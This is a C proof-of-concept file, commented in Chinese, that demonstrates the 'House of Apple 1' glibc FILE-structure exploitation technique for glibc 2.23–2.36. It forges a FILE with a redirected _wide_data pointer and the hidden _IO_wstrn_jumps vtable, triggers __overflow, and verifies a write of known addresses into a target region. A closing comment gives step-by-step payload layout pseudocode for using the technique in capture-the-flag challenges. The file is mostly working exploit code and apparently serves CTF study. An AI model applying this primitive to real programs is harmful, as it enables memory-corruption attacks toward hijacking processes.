#define _GNU_SOURCE
/*
 * House of Apple 1 已知值写最终触发点：glibc 2.23～2.36，x86-64。
 *
 * 模拟漏洞：攻击者已经能伪造 FILE，并把 FILE->_wide_data 指向目标地址。
 * 本 PoC 隔离验证原始 Apple1 的核心消费链：
 *
 *   调用入口：__overflow(fake_file, L'A')
 *     -> 合法 _IO_wstrn_jumps->_IO_wstrn_overflow
 *     -> 写入函数：_IO_wsetb(fake_file, fake_file->overflow_buf, ...)
 *     -> 把 overflow_buf 的已知地址写入 fake _wide_data 的多个字段
 *
 * `_IO_wstrn_jumps` 是 glibc hidden 符号，普通题目会用“libc 基址 + 附件
 * 符号偏移”得到它。上游 x86-64 glibc 2.23～2.36 中，它相对导出的
 * `_IO_wfile_jumps` 为 -0x300；这个相对值仍须按题目 libc 的 Build ID 复核。
 *
 * glibc 2.37 的 commit 118816de3383 把 vswprintf 改成 printf_buffer，并
 * 删除 `_IO_wstrn_overflow/_IO_wstrn_jumps`，所以本 PoC 不适用于 2.37+。
 */

#include <assert.h>
#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

typedef int (*overflow_fn)(FILE *, int);

/* x86-64 的 `_IO_wstrnfile` 布局：
 *   FILE 主结构          0x000～0x0d7
 *   主 vtable 指针       0x0d8
 *   两个兼容字段          0x0e0、0x0e8
 *   宽字符 overflow_buf  0x0f0
 */
enum {
    FILE_WIDE_DATA_OFFSET = 0xa0,
    FILE_VTABLE_OFFSET = 0xd8,
    WSTRN_OVERFLOW_BUF_OFFSET = 0xf0,
};

int main(void)
{
    setbuf(stdout, NULL);
    assert(sizeof(FILE) == FILE_VTABLE_OFFSET);

    overflow_fn call_overflow =
        (overflow_fn)dlsym(RTLD_DEFAULT, "__overflow");
    void *wfile_jumps = dlsym(RTLD_DEFAULT, "_IO_wfile_jumps");
    assert(call_overflow != NULL && wfile_jumps != NULL);

    /* 为伪造的 `_IO_wide_data` 准备一页清零的可写内存。 */
    uintptr_t *wide = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    assert(wide != MAP_FAILED);

    unsigned char fake_file[0x300] __attribute__((aligned(0x10)));
    memset(fake_file, 0, sizeof(fake_file));
    FILE *fp = (FILE *)fake_file;
    *(void **)(fake_file + FILE_WIDE_DATA_OFFSET) = wide;
    fp->_mode = 1; /* 避免 __overflow 把对象重新定向成窄字符流。 */

    const uintptr_t known =
        (uintptr_t)(fake_file + WSTRN_OVERFLOW_BUF_OFFSET);
    const uintptr_t center = (uintptr_t)wfile_jumps;
    const uintptr_t wstrn_jumps = center - 0x300;
    *(void **)(fake_file + FILE_VTABLE_OFFSET) = (void *)wstrn_jumps;

    int result = call_overflow(fp, L'A');
    assert(result == L'A');
    /* `_IO_wide_data` 前 0x40 字节必须全部得到 overflow_buf 的已知地址。 */
    assert(wide[0x00 / 8] == known);          /* 验证字段 _IO_read_ptr。 */
    assert(wide[0x08 / 8] == known + 0x100);  /* 验证字段 _IO_read_end。 */
    assert(wide[0x10 / 8] == known);          /* 验证字段 _IO_read_base。 */
    assert(wide[0x18 / 8] == known);          /* 验证字段 _IO_write_base。 */
    assert(wide[0x20 / 8] == known);          /* 验证字段 _IO_write_ptr。 */
    assert(wide[0x28 / 8] == known);          /* 验证字段 _IO_write_end。 */
    assert(wide[0x30 / 8] == known);          /* 验证字段 _IO_buf_base。 */
    assert(wide[0x38 / 8] == known + 0x100);  /* 验证字段 _IO_buf_end。 */
    puts("[+] Apple1：已知值写成功");

    munmap(wide, 0x1000);
    return 0;
}

/*
 * ======================== 题目布局伪代码 ========================
 *
 * 本文件上半部分已经真实调用 `_IO_wstrn_overflow` 并验证八个写入结果。
 * 迁移到题目时，不再运行独立布局生成器，按下面顺序直接构造 payload：
 *
 *     fake_file = 一块至少 0x1f0 字节的可控内存；
 *     known = fake_file + 0xf0；              // overflow_buf 的地址
 *     fake_file[0x20] = 0；                  // _IO_write_base
 *     fake_file[0x28] = 1；                  // _IO_write_ptr > base
 *     fake_file[0x88] = 可写且初始为零的锁；
 *     fake_file[0xa0] = target；             // fake _IO_wide_data
 *     fake_file[0xd8] = _IO_wstrn_jumps；    // 2.24+ 必须是合法表
 *
 *     保证 *(target + 0x30) == 0；
 *     触发对应的宽字符 overflow；
 *
 * 成功后 target+0x00/0x10/0x18/0x20/0x28/0x30 写入 known，
 * target+0x08/0x38 写入 known+0x100。`_IO_wstrn_jumps` 是隐藏符号，
 * 必须按附件 libc 的 Build ID 从调试符号或反汇编重新定位。
 */
